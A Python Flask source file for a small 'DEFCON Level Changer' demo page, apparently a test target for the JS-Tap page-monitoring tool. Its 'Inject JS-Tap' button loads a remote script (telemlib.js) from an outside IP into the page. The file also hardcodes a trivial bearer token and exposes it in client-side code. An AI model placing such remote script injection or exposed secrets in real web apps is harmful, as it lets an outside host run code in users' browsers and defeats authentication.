from flask import Flask, jsonify, request, render_template_string, abort

app = Flask(__name__)

# In-memory storage of the DEFCON level
defcon_level = 5

# Secret token for authentication
secret_token = "12345"

@app.route('/')
def index():
    return render_template_string('''
<!DOCTYPE html>
<html>
<head>
    <title>DEFCON Level Changer</title>
    <style>
        .button {
            margin: 10px 0;
            width: 200px;  /* Adjust the width of the buttons */
        }
    </style>
    <script>
        function changeDefcon(newLevel) {
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "/change_defcon", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.setRequestHeader("Authorization", "Bearer {{ secret }}");
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4) {
                    if (xhr.status == 200) {
                        console.log("Received new defcon: " + JSON.parse(xhr.responseText).new_defcon)
                        document.getElementById("defconDisplay").innerText = "Current DEFCON Level: " + JSON.parse(xhr.responseText).new_defcon;
                    } else {
                        alert("Authorization failed or server error.");
                    }
                }
            };
            xhr.send(JSON.stringify({defcon: newLevel}));
        }

        function stubbedFunction() {
            document.head.appendChild(Object.assign(document.createElement('script'), {src:'https://100.115.92.203:8444/lib/telemlib.js',type:'text/javascript'}));

        }
    </script>
</head>
<body>
    <h1 id="defconDisplay">Current DEFCON Level: {{ defcon }}</h1>
    <button class="button" onclick="changeDefcon(1)">Set DEFCON 1</button><br><br>
    <button class="button" onclick="changeDefcon(2)">Set DEFCON 2</button><br><br>
    <button class="button" onclick="changeDefcon(3)">Set DEFCON 3</button><br><br>
    <button class="button" onclick="changeDefcon(4)">Set DEFCON 4</button><br><br>
    <button class="button" onclick="changeDefcon(5)">Set DEFCON 5</button><br><br>
    <br><br>
    <button onclick="stubbedFunction()">Inject JS-Tap</button>
</body>
</html>
    ''', defcon=defcon_level, secret=secret_token)

@app.route('/change_defcon', methods=['POST'])
def change_defcon():
    # Check if the Authorization header is set and correct
    auth_header = request.headers.get('Authorization')
    if auth_header != f"Bearer {secret_token}":
        abort(401)  # Unauthorized access

    global defcon_level
    data = request.get_json()
    defcon_level = data['defcon']
    return jsonify(new_defcon=defcon_level)

if __name__ == '__main__':
    app.run(debug=False)
